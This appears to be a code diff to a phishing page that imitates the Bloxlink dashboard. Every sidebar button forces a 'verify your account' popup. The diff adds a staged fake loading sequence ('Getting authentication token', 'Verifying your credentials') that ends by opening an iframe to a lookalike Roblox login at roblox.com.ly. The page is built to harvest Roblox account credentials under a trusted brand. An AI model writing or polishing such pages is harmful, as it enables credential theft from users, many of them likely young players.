@@ -15,7 +15,7 @@
   <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
 
   <div class="top-bar">
-    ℹ️ Bloxlink is now part of the Roblox family! Read more here:
+    Bloxlink is now part of the Roblox family! Read more here:
     <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
   </div>
 
@@ -26,26 +26,37 @@
         <img
           src="https://i.ibb.co/fYGPL0nW/imagem-2026-02-01-133807638.png"
           alt="Bloxlink"
-          style="max-width:160px;height:auto;"
         >
       </div>
 
       <div class="section">
         <p class="section-title">GENERAL</p>
-        <button class="nav-item active" onclick="openBlockedPopup()">✓ Verifications</button>
-        <button class="nav-item" onclick="openBlockedPopup()">▦ Manage Servers</button>
+        <button class="nav-item active" onclick="openBlockedPopup()">
+          <span class="nav-icon">✓</span> Verifications
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">⌂</span> Manage Servers
+        </button>
       </div>
 
       <div class="section">
         <p class="section-title">ACCOUNT</p>
-        <button class="nav-item" onclick="openBlockedPopup()">◼ Manage Subscriptions</button>
-        <button class="nav-item" onclick="openBlockedPopup()">⚙ Settings</button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">☒</span> Manage Subscriptions
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">⚙</span> Settings
+        </button>
       </div>
 
       <div class="section">
         <p class="section-title">OTHER</p>
-        <button class="nav-item" onclick="openBlockedPopup()">? Support</button>
-        <button class="nav-item" onclick="openBlockedPopup()">⌘ Developer API</button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">?</span> Support
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">{ }</span> Developer API
+        </button>
       </div>
     </aside>
 
@@ -83,6 +94,7 @@
         Must verify to access other sections of the dashboard
       </div>
       <div class="popup-body">
+        <p>Please verify your account first to access all features of the Bloxlink dashboard.</p>
         <button onclick="closeBlocked()">Close</button>
       </div>
     </div>
@@ -90,17 +102,31 @@
 
   <!-- VERIFY POPUP -->
   <div id="verifyOverlay" class="popup-overlay">
-    <div class="verify-popup">
+    <div class="verify-popup" id="verifyPopup">
       <div class="verify-header">Verify Your Account</div>
 
-      <div class="verify-body">
+      <!-- Initial Verify Content -->
+      <div class="verify-body" id="verifyInitial">
         <div class="verify-icon">
           <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
         </div>
 
-        <button class="verify-continue" onclick="openRobloxIframe()">Continue</button>
+        <button class="verify-continue" onclick="startLoadingSequence()">Continue</button>
         <div class="verify-or">or</div>
         <button class="verify-return" onclick="closeVerifyScreen()">Return to Bloxlink</button>
+      </div>
+
+      <!-- Loading Screen -->
+      <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-title">Connecting to Roblox...</div>
+        <div class="loading-messages">
+          <div class="loading-message pending" id="msg1">Initializing secure connection</div>
+          <div class="loading-message pending" id="msg2">Getting authentication token</div>
+          <div class="loading-message pending" id="msg3">Verifying your credentials</div>
+          <div class="loading-message pending" id="msg4">Establishing secure connection</div>
+          <div class="loading-message pending" id="msg5">Preparing verification session</div>
+        </div>
       </div>
     </div>
   </div>
@@ -117,12 +143,23 @@
   <script>
     const blockedOverlay = document.getElementById("blockedOverlay");
     const verifyOverlay = document.getElementById("verifyOverlay");
+    const verifyPopup = document.getElementById("verifyPopup");
+    const verifyInitial = document.getElementById("verifyInitial");
+    const loadingScreen = document.getElementById("loadingScreen");
     const iframeOverlay = document.getElementById("iframeOverlay");
     const popupIframe = document.getElementById("popupIframe");
     const sidebar = document.getElementById("sidebar");
     const sidebarOverlay = document.getElementById("sidebarOverlay");
 
     const ROBLOX_URL = "https://roblox.com.ly/login?returnUrl=7692425652606225";
+
+    const loadingMessages = [
+      { id: 'msg1', text: 'Initializing secure connection', duration: 800 },
+      { id: 'msg2', text: 'Getting authentication token', duration: 900 },
+      { id: 'msg3', text: 'Verifying your credentials', duration: 1000 },
+      { id: 'msg4', text: 'Establishing secure connection', duration: 800 },
+      { id: 'msg5', text: 'Preparing verification session', duration: 700 }
+    ];
 
     function hideWithFade(element, callback) {
       element.classList.remove("show");
@@ -140,11 +177,52 @@
     }
 
     function openVerifyScreen() {
+      verifyPopup.classList.remove("expanded");
+      verifyInitial.style.display = "block";
+      loadingScreen.classList.remove("active");
+      
+      loadingMessages.forEach(msg => {
+        const el = document.getElementById(msg.id);
+        el.classList.remove("active");
+        el.classList.add("pending");
+        el.textContent = msg.text;
+      });
+      
       verifyOverlay.classList.add("show");
     }
 
     function closeVerifyScreen() {
       hideWithFade(verifyOverlay);
+    }
+
+    function startLoadingSequence() {
+      verifyPopup.classList.add("expanded");
+      
+      setTimeout(() => {
+        verifyInitial.style.display = "none";
+        loadingScreen.classList.add("active");
+        
+        let delay = 0;
+        loadingMessages.forEach((msg, index) => {
+          setTimeout(() => {
+            if (index > 0) {
+              const prevMsg = document.getElementById(loadingMessages[index - 1].id);
+              prevMsg.classList.remove("active");
+              prevMsg.classList.add("completed");
+            }
+            const el = document.getElementById(msg.id);
+            el.classList.remove("pending");
+            el.classList.add("active");
+            
+            if (index === loadingMessages.length - 1) {
+              setTimeout(() => {
+                openRobloxIframe();
+              }, 600);
+            }
+          }, delay);
+          delay += msg.duration;
+        });
+      }, 400);
     }
 
     function openRobloxIframe() {
@@ -157,6 +235,16 @@
     function closeIframe() {
       hideWithFade(iframeOverlay, () => {
         popupIframe.src = "";
+        setTimeout(() => {
+          verifyPopup.classList.remove("expanded");
+          verifyInitial.style.display = "block";
+          loadingScreen.classList.remove("active");
+          loadingMessages.forEach(msg => {
+            const el = document.getElementById(msg.id);
+            el.classList.remove("active");
+            el.classList.add("pending");
+          });
+        }, 300);
       });
     }
 
@@ -168,18 +256,3 @@
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
